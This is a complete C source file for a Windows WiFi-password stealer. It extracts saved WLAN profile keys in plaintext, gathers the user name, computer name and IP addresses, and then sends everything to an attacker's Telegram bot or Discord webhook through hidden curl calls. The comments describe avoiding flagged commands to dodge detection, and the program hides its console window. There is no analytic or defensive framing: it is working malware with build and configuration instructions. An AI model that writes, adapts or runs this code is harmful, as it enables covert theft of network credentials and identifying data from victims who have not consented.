/*
 * wifi_grab.c — Extracts WiFi passwords via Windows WLAN API
 * Sends results to Telegram bot
 * 
 * This calls the same Windows API that Windows itself uses
 * to manage WiFi — no netsh, no PowerShell, no flagged commands.
 * 
 * Compile: gcc wifi_grab.c -o wifi_grab.exe -lwlanapi -lwinhttp -lole32
 */

#include <windows.h>
#include <wlanapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winhttp.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "winhttp.lib")

// ══════════════════════════════════════════════════
// EXFIL CONFIG — Set via compiler flags:
//
// Telegram:  cl ... /DUSE_TELEGRAM /DTG_TOKEN="bot_token" /DTG_CHAT="chat_id"
// Discord:   cl ... /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
//
// If nothing is defined, defaults to Telegram with these values:
// ══════════════════════════════════════════════════

#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
#define USE_TELEGRAM
#endif

#ifndef TG_TOKEN
#define TG_TOKEN "YOUR_BOT_TOKEN"
#endif

#ifndef TG_CHAT
#define TG_CHAT "YOUR_CHAT_ID"
#endif

#ifndef DC_WEBHOOK
#define DC_WEBHOOK ""
#endif

// ══════════════════════════════════════════════════

// Write results to a temp file
void grab_wifi(const char *outpath) {
    HANDLE hClient = NULL;
    DWORD dwVersion = 0;
    DWORD dwResult = 0;
    
    FILE *fp = fopen(outpath, "w");
    if (!fp) return;
    
    // Get computer name
    char compName[256];
    DWORD compSize = sizeof(compName);
    GetComputerNameA(compName, &compSize);
    
    char userName[256];
    DWORD userSize = sizeof(userName);
    GetUserNameA(userName, &userSize);
    
    fprintf(fp, "=== WiFi Passwords ===\n");
    fprintf(fp, "Computer: %s\n", compName);
    fprintf(fp, "User: %s\n", userName);

    // Get private IP
    char tp[MAX_PATH];
    GetTempPathA(MAX_PATH, tp);
    char ipCmd[256];
    snprintf(ipCmd, sizeof(ipCmd), "ipconfig | findstr /i \"IPv4\" > %sipv4.txt", tp);
    system(ipCmd);
    char ipFile2[MAX_PATH];
    snprintf(ipFile2, MAX_PATH, "%sipv4.txt", tp);
    FILE *ipf2 = fopen(ipFile2, "r");
    if (ipf2) {
        char line[256];
        fprintf(fp, "Private IPs:\n");
        while (fgets(line, sizeof(line), ipf2)) {
            fprintf(fp, "  %s", line);
        }
        fclose(ipf2);
        DeleteFileA(ipFile2);
    }
    fprintf(fp, "\n");
    
    // Open WLAN handle
    dwResult = WlanOpenHandle(2, NULL, &dwVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        fprintf(fp, "Error: Could not open WLAN handle (%lu)\n", dwResult);
        fclose(fp);
        return;
    }
    
    // Enumerate interfaces
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        fprintf(fp, "Error: Could not enum interfaces (%lu)\n", dwResult);
        WlanCloseHandle(hClient, NULL);
        fclose(fp);
        return;
    }
    
    // For each interface
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[i];
        
        // Get profile list
        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        dwResult = WlanGetProfileList(hClient, &pIfInfo->InterfaceGuid, NULL, &pProfileList);
        if (dwResult != ERROR_SUCCESS) continue;
        
        // For each profile
        for (DWORD j = 0; j < pProfileList->dwNumberOfItems; j++) {
            PWLAN_PROFILE_INFO pProfile = &pProfileList->ProfileInfo[j];
            
            // Get profile XML (contains password in plaintext)
            LPWSTR pProfileXml = NULL;
            DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD dwAccess = 0;
            
            dwResult = WlanGetProfile(hClient, &pIfInfo->InterfaceGuid,
                pProfile->strProfileName, NULL, &pProfileXml, &dwFlags, &dwAccess);
            
            if (dwResult == ERROR_SUCCESS && pProfileXml) {
                // Extract SSID name
                char ssid[256];
                wcstombs(ssid, pProfile->strProfileName, sizeof(ssid));
                
                // Find keyMaterial in XML (the password)
                wchar_t *keyStart = wcsstr(pProfileXml, L"<keyMaterial>");
                wchar_t *keyEnd = wcsstr(pProfileXml, L"</keyMaterial>");
                
                if (keyStart && keyEnd) {
                    keyStart += wcslen(L"<keyMaterial>");
                    int keyLen = (int)(keyEnd - keyStart);
                    char key[256] = {0};
                    wcstombs(key, keyStart, keyLen < 255 ? keyLen : 255);
                    fprintf(fp, "%-32s | %s\n", ssid, key);
                } else {
                    fprintf(fp, "%-32s | (open/no password)\n", ssid);
                }
                
                WlanFreeMemory(pProfileXml);
            }
        }
        
        if (pProfileList) WlanFreeMemory(pProfileList);
    }
    
    if (pIfList) WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    fclose(fp);
}

// Send file to Telegram using curl (simpler than WinHTTP for multipart)
// Get machine info (cached)
static char g_info_caption[512] = {0};

void init_info() {
    if (g_info_caption[0] != 0) return;

    char compName[256], userName[256], pubIP[64] = {0}, privIP[64] = {0};
    DWORD s1 = sizeof(compName), s2 = sizeof(userName);
    GetComputerNameA(compName, &s1);
    GetUserNameA(userName, &s2);

    // Public IP
    system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char ipf[MAX_PATH];
    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
    FILE *f = fopen(ipf, "r");
    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
    char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
    nl = strchr(pubIP, '\r'); if (nl) *nl = 0;

    // Private IP
    char pf[MAX_PATH];
    snprintf(pf, MAX_PATH, "%spriv.txt", tmp);
    system("ipconfig | findstr /i \"IPv4\" > %temp%\\priv.txt 2>nul");
    f = fopen(pf, "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            char *colon = strchr(line, ':');
            if (colon) {
                colon++;
                while (*colon == ' ') colon++;
                nl = strchr(colon, '\r'); if (nl) *nl = 0;
                nl = strchr(colon, '\n'); if (nl) *nl = 0;
                strncpy(privIP, colon, sizeof(privIP)-1);
                break;
            }
        }
        fclose(f);
        DeleteFileA(pf);
    }

    snprintf(g_info_caption, sizeof(g_info_caption),
        "%s@%s [pub:%s priv:%s]", userName, compName, pubIP, privIP);
}

void send_file(const char *filepath) {
    init_info();
    char cmd[2048];

#ifdef USE_TELEGRAM
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"chat_id=" TG_CHAT "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_info_caption);
#endif

#ifdef USE_DISCORD
    // Discord webhook sends file as multipart
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"file=@%s\" "
        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        filepath, g_info_caption);
#endif

    system(cmd);
}

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%swg.txt", tempPath);

    // Grab WiFi passwords
    grab_wifi(outFile);

    // Send to Telegram
    send_file(outFile);

    // Clean up
    DeleteFileA(outFile);

    return 0;
}
